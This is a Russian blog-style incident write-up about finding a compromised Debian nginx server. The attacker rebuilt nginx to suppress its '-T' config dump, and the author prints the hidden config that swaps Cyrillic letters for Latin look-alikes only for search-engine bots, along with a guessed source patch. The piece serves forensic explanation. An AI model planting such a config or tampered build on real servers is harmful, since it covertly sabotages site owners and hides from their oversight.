Пренеприятнейшая история случилась с одним моим знакомым. Но насколько она оказалась неприятной для Михаила, настолько же занимательной для меня.

Надо сказать, что приятель мой вполне себе UNIX-пользователь: может сам поставить систему, установить mysql, php и сделать простейшие настройки nginx.
И есть у него десяток-полтора сайтов посвященных строительным инструментам.

Один из таких сайтов, посвященный бензопилам, плотненько сидит в ТОПe поисковиков. Сайт этот — некоммерческий обзорник, но кому-то поперек горла и повадились его атаковать. То DDoS, то брутфорс, то комменты напишут непотребные и шлют абузы на хостинг и в РКН.
Неожиданно всё стихло и это затишье оказалось не к добру, а сайт начал постепенно покидать верхние строчки выдачи.

![](https://habrastorage.org/r/w1560/getpro/habr/post_images/528/5d5/582/5285d55827ddf5cb5705b364a417828f.png)

То была присказка, дальше сама админская байка.

[](CUT)

Время близилось ко сну когда раздался звонок телефона: «Сань, ты не глянешь мой сервер? Мне кажется меня хакнули, доказать не могу, но ощущение не покидает уже третью неделю. Может мне просто пора лечиться от паранойи?»

Далее пошло получасовое обсуждение которое кратко можно изложить так:

* почва для взлома была вполне плодородной;
* взломщик мог получить права суперпользователя;
атака (если она имела место) была целенаправленной и именно на этот сайт;
* проблемные места исправлены и нужно только понять был ли факт проникновения;
* взлом не мог коснуться кода сайта и баз данных.

Касательно последнего пункта.
![](https://habrastorage.org/r/w1560/getpro/habr/post_images/f7f/a85/93d/f7fa8593d835c577dd321eec9e30e2e4.png)

В мир смотрит только белый IP фронтенда. Между бакендами и фронтендом нет никакого обмена кроме http(s), пользователи/пароли разные, ключами не обменивались. На серых адресах все порты кроме 80/443 закрыты. Белые IP бакендов известны только двум пользователям, которым Михаил всецело доверяет.

На фронтенде установлена Debian 9 и к моменту звонка система изолирована от мира внешним firewall'ом и остановлена.

«Ok, давай доступы, — решаю отложить сон на часок. — Посмотрю своим глазом».

Здесь и далее:

```
$ grep -F PRETTY_NAME /etc/*releas*
PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
$ `echo $SHELL` --version
GNU bash, version 4.4.12(1)-release (x86_64-pc-linux-gnu)
$ nginx -v
nginx version: nginx/1.10.3
$ gdb --version
GNU gdb (Debian 8.2.1-2) 8.2.1
```

## В поисках возможного взлома

Запускаю сервер, сначала в rescue-mode. Монтирую диски, пролистываю auth-логи, history, системные логи и т.п., по возможности проверяю даты создания файлов, хотя понимаю, что нормальный взломщик «подмел» бы за собой, да и Миша уже знатно «натоптал» пока искал сам.

Стартую в нормальном режиме, особо пока не понимая что искать, изучаю конфиги. В первую очередь интересует nginx так как, в общем-то, на фронтенде кроме него и нет ничего.
Конфиги небольшие, хорошо структурированые в десяток файлов, просматриваю их просто cat'ом по очереди. Вроде всё чисто, но мало-ли упустил какой-то include, сделаю-ка я полный листинг:

```
$ nginx -T
nginx: the configuration file /usr/local/etc/nginx/nginx.conf syntax is ok
nginx: configuration file /usr/local/etc/nginx/nginx.conf test is successful
```

Не понял: «Где листинг-то?»

```
$ nginx -V
nginx version: nginx/1.10.3
TLS SNI support enabled
configure arguments: --with-cc-opt='-g -O2' --with-ld-opt='-Wl,-z,relro -Wl,-z,now' --prefix=/usr/share/nginx --conf-path=/etc/nginx/nginx.conf --http-log-path=/var/log/nginx/access.log --error-log-path=/var/log/nginx/error.log --lock-path=/var/lock/nginx.lock --pid-path=/run/nginx.pid --modules-path=/usr/lib/nginx/modules --http-client-body-temp-path=/var/lib/nginx/body --http-fastcgi-temp-path=/var/lib/nginx/fastcgi --http-proxy-temp-path=/var/lib/nginx/proxy --http-scgi-temp-path=/var/lib/nginx/scgi --http-uwsgi-temp-path=/var/lib/nginx/uwsgi --with-debug --with-pcre-jit --with-ipv6 --with-http_ssl_module --with-http_stub_status_module --with-http_realip_module --with-http_auth_request_module --with-http_v2_module --with-http_dav_module --with-http_slice_module --with-threads --with-http_addition_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_sub_module --with-stream=dynamic --with-stream_ssl_module --with-mail=dynamic --with-mail_ssl_module
```

К вопросу о листинге добавляется второй: «Почему такая древняя версия nginx?»

К тому же система считает, что версия установлена свежее:

```
$ dpkg -l nginx | grep "[n]ginx"
ii  nginx          1.14.2-2+deb10u1 all          small, powerful, scalable web/proxy server
```

Звоню:
- Миш, ты зачем пересобирал nginx?
- Окстись, я даже не знаю как это сделать!
- Ok, ну, спи…

Nginx однозначно пересобран и вывод листинга по "-T" скрыт неспроста. Сомнений во взломе уже нет и можно это просто принять и (раз уж Миша всё-равно заменил сервер новым) посчитать проблему решенной.

И действительно, раз уж некто получил права root'а, то имеет смысл делать только system reinstall, а искать, что там было набедокурено бесполезно, но в этот раз любопытство победило сон. Как же узнать что от нас хотели скрыть?

Попробуем оттрассировать:

```
$ strace nginx -T
```

Просматриваем, в трассировке явно не хватает строк а-ля

```
write(1, "/etc/nginx/nginx.conf", 21/etc/nginx/nginx.conf)   = 21
write(1, "...
write(1, "\n", 1
```

Ради интереса сравниваем выводы

```
$ strace nginx -T 2>&1 | wc -l
264
$ strace nginx -t 2>&1 | wc -l
264
```

Думаю, что часть кода /src/core/nginx.c

```c
            case 't':
                ngx_test_config = 1;
                break;

            case 'T':
                ngx_test_config = 1;
                ngx_dump_config = 1;
                break;
```
была приведена к виду:
```c
            case 't':
                ngx_test_config = 1;
                break;

            case 'T':
                ngx_test_config = 1;
                //ngx_dump_config = 1;
                break;
```
или
```c
            case 't':
                ngx_test_config = 1;
                break;

            case 'T':
                ngx_test_config = 1;
                ngx_dump_config = 0;
                break;
```
поэтому листинг по "-T" не отображается.

## Но как же посмотреть наш конфиг?
Если моя мысль верна и проблема только в переменной ngx_dump_config попробуем установить её c помощью gdb, благо ключик --with-cc-opt -g присутствует и надеемся, что оптимизация -O2 нам не помешает. При этом, раз я не знаю как ngx_dump_config могла быть обработана в case 'T':, не будем вызывать этот блок, а установим её используя case 't':

По шагам:
* устанавливаем точку останова в функции main()
* запускаем программу
* изменяем значение переменной определяющей вывод конфига ngx_dump_config=1
* продолжаем/завершаем программу

Как видим реальный конфиг отличается от нашего, выделяем из него паразитный кусок:

```
map $http_user_agent $sign_user_agent
{
"~*yandex.com/bots" 1;
"~*www.google.com/bot.html" 1;
default 0;
}

map $uri $sign_uri
{
"~*/wp-" 1;
default 0;
}

map о:$sign_user_agent:$sign_uri $sign_o
{
о:1:0 o;
default о;
}

map а:$sign_user_agent:$sign_uri $sign_a
{
а:1:0 a;
default а;
}

sub_filter_once off;
sub_filter 'о' $sign_o;
sub_filter 'а' $sign_a;
```
Рассмотрим по порядку что же здесь происходит.

Определяются User-Agent'ы yandex/google:
```
map $http_user_agent $sign_user_agent
{
"~*yandex.com/bots" 1;
"~*www.google.com/bot.html" 1;
default 0;
}
```

Исключаются служебные страницы wordpress:
```
map $uri $sign_uri
{
"~*/wp-" 1;
default 0;
}
```

И для тех, кто попал под оба вышеперечисленных условия
```
map о:$sign_user_agent:$sign_uri $sign_o
{
о:1:0 o;
default о;
}

map а:$sign_user_agent:$sign_uri $sign_a
{
а:1:0 a;
default а;
}
```

в тексте html-страницы изменяется 'о' на 'o' и 'а' на 'a':
```
sub_filter_once off;
sub_filter 'о' $sign_o;
sub_filter 'а' $sign_a;
```

Именно так, тонкость только в том что 'а' != 'a' так же как и 'о' != 'o':
![](https://habrastorage.org/r/w1560/getpro/habr/post_images/528/5d5/582/5285d55827ddf5cb5705b364a417828f.png)

Таким образом боты поисковых систем получают вместо нормального 100%-кириллического текста модифицированный мусор разбавленный латинскими 'a' и 'o'. Не берусь рассуждать, как это влияет на SEO, но вряд ли такая буквенная мешанина позитивно скажется на позициях в выдаче.

Что сказать, ребята с фантазией.

## Ссылки
* [Отладка с помощью GDB](https://www.opennet.ru/docs/RUS/gdb/)
* [gdb(1) — Linux man page](https://linux.die.net/man/1/gdb)
* [strace(1) — Linux man page](https://linux.die.net/man/1/strace)
* [Nginx — Module ngx_http_sub_module](http://nginx.org/en/docs/http/ngx_http_sub_module.html)
* [О пилах, бензопилах и электропилах](https://opilah.com/)
